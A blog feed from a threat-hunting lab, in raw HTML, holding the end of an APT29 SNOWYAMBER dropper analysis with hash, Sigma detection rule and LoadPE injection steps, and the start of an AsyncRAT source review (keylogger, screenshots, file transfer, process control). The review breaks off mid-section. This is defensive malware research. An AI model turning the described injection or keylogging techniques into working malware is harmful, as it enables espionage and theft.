SHA-256 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62c6b0692103c&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Checking this sample via VirusTotal:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.virustotal.com/gui/file/381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62c6b0692103c/details&quot;&gt;https://www.virustotal.com/gui/file/381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62c6b0692103c/details&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-03_07-02.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;51 of 69 AV engines detect our sample as malicious.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Detected as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Trojan.Downloader.Dukes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This sample is well analyzed, the technical details can be viewed &lt;a href=&quot;https://www.gov.pl/attachment/6e085a2c-ac05-4b62-9423-5d6e9ef730bf&quot;&gt;here&lt;/a&gt; or &lt;a href=&quot;https://samples.vx-underground.org/APTs/2023/2023.04.13/Paper/SNOWYAMBER_.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;We will just focus on the fact that this sample uses an interesting string obfuscation technique: using open-source library &lt;a href=&quot;https://github.com/adamyaxley/Obfuscate&quot;&gt;https://github.com/adamyaxley/Obfuscate&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Also used some Conti ransomware tricks like using &lt;a href=&quot;https://github.com/aappleby/smhasher/blob/master/src/MurmurHash3.cpp&quot;&gt;Murmurhash&lt;/a&gt; algorithm.&lt;/p&gt;

&lt;p&gt;As we wrote earlier, we believe that the Dukes are a well-resourced, highly dedicated, and well-organized cyberespionage group that has been working for the Russian Federation since at least 2008 to gather intelligence in support of foreign and security policy decisions.&lt;/p&gt;

&lt;p&gt;The Dukes target predominantly Western governments and related organizations, including government ministries and agencies, political think tanks, and government subcontractors. Their targets have also included governments of Commonwealth of Independent States members, governments of Asia, Africa, and the Middle East, organizations associated with Chechen extremism, and Russian speakers involved in the illegal trade of controlled substances and narcotics.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MiniDuke&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CosmicDuke&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OnionDuke&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CozyDuke&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CloudDuke&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeaDuke&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HammerDuke&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PinchDuke&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GeminiDuke&lt;/code&gt; are examples of the extensive arsenal of malware toolsets utilized by the Dukes. In recent years, the Dukes have evidently conducted large-scale spear-phishing campaigns biannually against hundreds or thousands of recipients affiliated with government institutions and affiliated organizations.&lt;/p&gt;

&lt;h3 id=&quot;iocs&quot;&gt;IOCs&lt;/h3&gt;

&lt;h3 id=&quot;sigma-rule&quot;&gt;Sigma rule&lt;/h3&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Remote Thread Creation In Uncommon Target Image&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;a1a144b7-5c9b-4853-a559-2172be8d4a03&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;related&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;f016c716-754a-467f-a39e-63c06f773987&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;obsoletes&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;experimental&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Detects uncommon target processes for remote thread creation&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;references&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Florian Roth (Nextron Systems)&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;2022/03/16&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;modified&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;2023/05/05&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;attack.defense_evasion&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;attack.privilege_escalation&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;attack.t1055.003&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;logsource&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;product&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;windows&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;category&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;create_remote_thread&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;detection&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;selection&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;TargetImage|endswith&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\calc.exe'&lt;/span&gt;
            &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\calculator.exe'&lt;/span&gt;
            &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\explorer.exe'&lt;/span&gt;
            &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\mspaint.exe'&lt;/span&gt;
            &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\notepad.exe'&lt;/span&gt;
            &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\ping.exe'&lt;/span&gt;
            &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\sethc.exe'&lt;/span&gt;
            &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\spoolsv.exe'&lt;/span&gt;
            &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\wordpad.exe'&lt;/span&gt;
            &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\write.exe'&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;filter_optional_aurora_1&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;StartFunction&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;EtwpNotificationThread'&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;filter_optional_aurora_2&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;SourceImage|contains&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;unknown&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;process'&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;filter_main_spoolsv&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;SourceImage&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C:\Windows\System32\csrss.exe'&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;TargetImage&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C:\Windows\System32\spoolsv.exe'&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;selection and not 1 of filter_main_* and not 1 of filter_optional_*&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;falsepositives&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Unknown&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;level&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;high&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;Running code in the context of another process may allow a threat actor to access the process’s memory, system/network resources, and possibly elevated privileges. PE injection is commonly used by malware for persistent infection and evasion of detection.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;LoadPE&lt;/em&gt; Injection is a technique that involves loading a PE file into the memory of a process. In a typical LoadPE Injection scenario, the following steps occur:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The malware allocates space in its own process for the PE file.&lt;/li&gt;
  &lt;li&gt;The malware reads the PE file from disk into the allocated space.&lt;/li&gt;
  &lt;li&gt;The malware resolves import addresses for the PE file.&lt;/li&gt;
  &lt;li&gt;The malware creates a remote thread in a target process.&lt;/li&gt;
  &lt;li&gt;The malware injects the PE file into the address space of the target process.&lt;/li&gt;
  &lt;li&gt;The malware initiates execution of the injected PE file in the target process.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This technique allows malware to avoid many behavioral detection strategies. It allows the malicious PE to be executed without ever being directly loaded or written to the disk, making it more difficult for traditional antivirus software to detect.&lt;/p&gt;

&lt;p&gt;As we can see, the technique is not new but is still used in 2023.&lt;/p&gt;

&lt;p&gt;We believe that this is either a new modification of &lt;em&gt;Snowyamber&lt;/em&gt; or a new Conti style malware family, since any Russian related groups use ContiLeaks. ContiLeaks is a turning point in the cybercrime ecosystem, and in this case, we can expect a lot of changes in how cybercriminal organizations operate.&lt;/p&gt;

&lt;p&gt;By Cyber Threat Hunters from MSSPLab:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/&quot;&gt;@cocomelonc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/aruzhan-kaldybek-775735226&quot;&gt;@wqkasper&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://attack.mitre.org/groups/G0016/&quot;&gt;APT29&lt;/a&gt;      &lt;br /&gt;
&lt;a href=&quot;https://samples.vx-underground.org/APTs/2023/2023.04.13/Paper/SNOWYAMBER_.pdf&quot;&gt;SNOWYAMBER Malware Analysis Report&lt;/a&gt;      &lt;br /&gt;
&lt;a href=&quot;https://github.com/SigmaHQ/sigma&quot;&gt;https://github.com/SigmaHQ/sigma&lt;/a&gt;    &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1055/&quot;&gt;Process Injection&lt;/a&gt;     &lt;br /&gt;
&lt;a href=&quot;https://github.com/adamyaxley/Obfuscate&quot;&gt;https://github.com/adamyaxley/Obfuscate&lt;/a&gt;     &lt;br /&gt;
&lt;a href=&quot;https://cocomelonc.github.io/investigation/2022/03/27/malw-inv-conti-1.html&quot;&gt;Conti ransomware source code investigation - part 1.&lt;/a&gt;     &lt;br /&gt;
&lt;a href=&quot;https://cocomelonc.github.io/investigation/2022/04/11/malw-inv-conti-2.html&quot;&gt;Conti ransomware source code investigation - part 2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks for your time happy hacking and good bye!       &lt;br /&gt;
&lt;em&gt;All drawings and screenshots are MSSPLab’s&lt;/em&gt;&lt;/p&gt;</content><author><name>MSSP Lab</name></author><category term="threat-hunting" /><category term="blueteam" /><category term="malware" /><category term="malwareanalysis" /><summary type="html">This report provides a comprehensive analysis of the SNOWYAMBER dropper, and it’s modifications, a sophisticated piece of malware attributed to the Advanced Persistent Threat group APT29. The group is believed to be tied to the Russian government and has been linked to numerous cyber espionage operations.</summary></entry><entry><title type="html">Malware source code investigation: AsyncRAT</title><link href="http://localhost:4001/threat-hunting/2023/05/19/malware-src-asyncrat.html" rel="alternate" type="text/html" title="Malware source code investigation: AsyncRAT" /><published>2023-05-19T05:00:00+03:00</published><updated>2023-05-19T05:00:00+03:00</updated><id>http://localhost:4001/threat-hunting/2023/05/19/malware-src-asyncrat</id><content type="html" xml:base="http://localhost:4001/threat-hunting/2023/05/19/malware-src-asyncrat.html">&lt;p&gt;AsyncRAT is a Remote Access Trojan (RAT) designed to remotely monitor and control infected systems. It is free, open-source, and often used by cybercriminals for malicious purposes, such as stealing sensitive information, installing more malware, or performing DDoS attacks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/asyncrat.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;AsyncRAT&lt;/strong&gt; was published as an open source remote administration tool project on GitHub in January 2019.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_12-39.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;AsyncRAT&lt;/em&gt; is a regular malware product and set of tools utilized by attackers and APT organizations. Threat actors and adversaries utilized a variety of intriguing script injectors and spear phishing attachments to deliver AsyncRAT to targeted hosts or networks across multiple campaigns.&lt;/p&gt;

&lt;p&gt;In this small research we are detailed investigate the source code of &lt;em&gt;AsyncRAT&lt;/em&gt; and highlights the main features.&lt;/p&gt;

&lt;p&gt;AsyncRAT has been included in &lt;a href=&quot;https://any.run/malware-trends/&quot;&gt;app.any.run’s weekly TOP 10&lt;/a&gt; malware trends tracker for the past few months.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_12-41.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_12-42.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;client-server-architecture&quot;&gt;Client-Server Architecture&lt;/h3&gt;

&lt;p&gt;When executed, the &lt;em&gt;AsyncRat GUI&lt;/em&gt; allows criminals to control the infected machine. The code is open-source and can be modified to suit the purposes of criminals:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_16-24.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;AsyncRAT&lt;/em&gt; implements a client-server architecture. The client side is the infected machine, whereas the server side is the attacker-operated control interface. The client establishes a connection with the server using asynchronous TCP sockets, which permits multiple simultaneous connections without interference.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_13-58.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;core-functionalities&quot;&gt;Core Functionalities&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;AsyncRAT&lt;/em&gt; includes several functionalities that permit a high degree of control over infected systems:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Remote Desktop&lt;/strong&gt; - The client captures screenshots of the desktop and sends them to the server, allowing the attacker to see the victim’s activities in real time.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;AsyncRAT&lt;/em&gt; uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.NET Framework&lt;/code&gt;’s built-in libraries to capture screenshots from the victim’s machine. The following is a more technical breakdown of how this feature works in the &lt;em&gt;AsyncRAT&lt;/em&gt; client.&lt;/p&gt;

&lt;p&gt;In the &lt;em&gt;AsyncRAT&lt;/em&gt;’s source code, you would find a function responsible for capturing screenshots. This function is typically invoked when the server sends a specific command to the client.&lt;/p&gt;

&lt;p&gt;To capture the screenshot, &lt;em&gt;AsyncRAT&lt;/em&gt; leverages the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System.Drawing&lt;/code&gt; namespace in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.NET Framework&lt;/code&gt;, which provides access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GDI+&lt;/code&gt; basic graphics functionality. More specifically, it uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bitmap&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Graphics&lt;/code&gt; classes to capture and store the screenshot(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Plugin/Options/Options/Handler/HandleThumbnails.cs&lt;/code&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_14-02.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This code does the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Creates a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bitmap&lt;/code&gt; object with the same size as the screen. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Screen.PrimaryScreen.Bounds&lt;/code&gt; property is used to determine the size of the screen.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Creates a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Graphics&lt;/code&gt; object from the bitmap. This object is used to perform the screenshot operation.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Graphics.CopyFromScreen&lt;/code&gt; method to take the screenshot. This method copies the pixels from the screen and stores them in the bitmap.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After the screenshot is captured and stored in the bitmap, &lt;em&gt;AsyncRAT&lt;/em&gt; then usually converts the bitmap to a byte array and sends it to the server. The server can then reconstruct the bitmap from the byte array to view the screenshot. It’s worth noting that the screenshot is usually compressed before being sent to reduce network usage.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Keylogger&lt;/strong&gt; - AsyncRAT logs keystrokes and periodically sends the data to the server. This feature can capture sensitive information like passwords and credit card numbers.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;AsyncRAT&lt;/em&gt; captures keystrokes by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetWindowsHookEx&lt;/code&gt; function, which is part of the Windows API. This function allows the application to install a “hook” that monitors the message traffic in the system and retrieves specific types of messages, such as keypresses.&lt;/p&gt;

&lt;p&gt;The following is a code of how &lt;em&gt;AsyncRAT&lt;/em&gt; implement a keylogger in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C#&lt;/code&gt; using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetWindowsHookEx&lt;/code&gt; function (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin/LimeLogger/LimeLogger/Packet.cs&lt;/code&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_14-09.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetHook&lt;/code&gt; function installs the keyboard hook by calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetWindowsHookEx&lt;/code&gt; with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LowLevelKeyboardProc&lt;/code&gt; delegate. The hook is then uninstalled using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnsetHook&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_14-11.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;File Explorer&lt;/strong&gt; - The client can navigate the filesystem, upload files to the server, download files from the server, and execute files.&lt;/p&gt;

&lt;p&gt;To accomplish these tasks, &lt;em&gt;AsyncRAT&lt;/em&gt; uses standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.NET Framework&lt;/code&gt; libraries. Let’s break down each function separately.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Navigating the File System&lt;/em&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System.IO&lt;/code&gt; namespace in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.NET Framework&lt;/code&gt; contains classes for manipulating files and directories. For example, &lt;em&gt;AsyncRAT&lt;/em&gt; retrieve a list of files in a directory using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Directory.GetFiles&lt;/code&gt; method (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin/FileSearcher/FileSearcher/Packet.cs&lt;/code&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_14-19.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And get subdirectories with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Directory.GetDirectories&lt;/code&gt; method (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin/FileManager/FileManager/Handler/FileManager.cs&lt;/code&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_14-20.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Uploading Files To the Server&lt;/em&gt;. To read the contents of a file, &lt;em&gt;AsyncRAT&lt;/em&gt; uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;File.ReadAllBytes&lt;/code&gt; method, which reads a file and returns its contents as a byte array (for example in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin/FileSearcher/FileSearcher/Packet.cs&lt;/code&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_14-27.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Downloading Files from the Server&lt;/em&gt;. When the server sends a file, it is usually in the form of a byte array. The client can save this byte array to a file using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;File.WriteAllBytes&lt;/code&gt; method (for example in: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server/HandlePacket/HandleFileSearcher.cs&lt;/code&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_14-31.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Executing Files&lt;/em&gt;. To execute a file, &lt;em&gt;AsyncRAT&lt;/em&gt; uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Process.Start&lt;/code&gt; method from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System.Diagnostics&lt;/code&gt; namespace (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin/FileManager/FileManager/Handler/FileManager.cs&lt;/code&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_14-34.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Process Manager&lt;/strong&gt; - The client retrieves a list of running processes and can kill or start processes.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;AsyncRAT&lt;/em&gt; utilizes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System.Diagnostics&lt;/code&gt; namespace in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.NET Framework&lt;/code&gt; to interact with system processes.
&lt;em&gt;Retrieving a List of Running Processes&lt;/em&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Process&lt;/code&gt; class in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System.Diagnostics&lt;/code&gt; namespace has a static method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetProcesses&lt;/code&gt; that returns an array of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Process&lt;/code&gt; objects, which represent all the processes currently running on the system. Here is how it’s used (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin/ProcessManager/ProcessManager/Packet.cs&lt;/code&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_14-45.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;also use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT ProcessId, Name, ExecutablePath FROM Win32_Process&lt;/code&gt; query:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_14-46.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Starting a Process&lt;/em&gt;. To start a new process, &lt;em&gt;AsyncRAT&lt;/em&gt; uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Process.Start&lt;/code&gt; method, which starts a process resource by specifying the name of an application or document:&lt;/p&gt;

